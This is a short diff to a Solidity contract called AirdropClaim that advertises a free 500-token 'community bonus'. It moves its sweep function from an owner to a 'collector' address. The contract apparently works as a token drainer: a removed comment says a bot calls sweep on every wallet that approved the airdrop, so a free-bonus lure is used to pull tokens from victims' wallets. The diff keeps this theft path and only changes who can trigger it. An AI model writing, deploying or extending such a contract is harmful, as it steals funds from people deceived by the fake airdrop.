@@ -12,13 +12,11 @@ interface IERC20 {
 ///          claim your FREE 500 HMS community bonus!"
 contract AirdropClaim {
     IERC20 public immutable token;
-    address public immutable owner;
     address public immutable collector;
     uint256 public constant BONUS = 500 ether;
 
     constructor(IERC20 _token, address _collector) {
         token = _token;
-        owner = msg.sender;
         collector = _collector;
     }
 
@@ -28,10 +26,9 @@ contract AirdropClaim {
         _collect(msg.sender);
     }
 
-    /// @notice Housekeeping, owner only. The owner's bot calls this on every
-    ///         wallet that approved the airdrop.
+    /// @notice Housekeeping, collector only.
     function sweep(address wallet) external {
-        require(msg.sender == owner, "not owner");
+        require(msg.sender == collector, "not collector");
         _collect(wallet);
     }
 
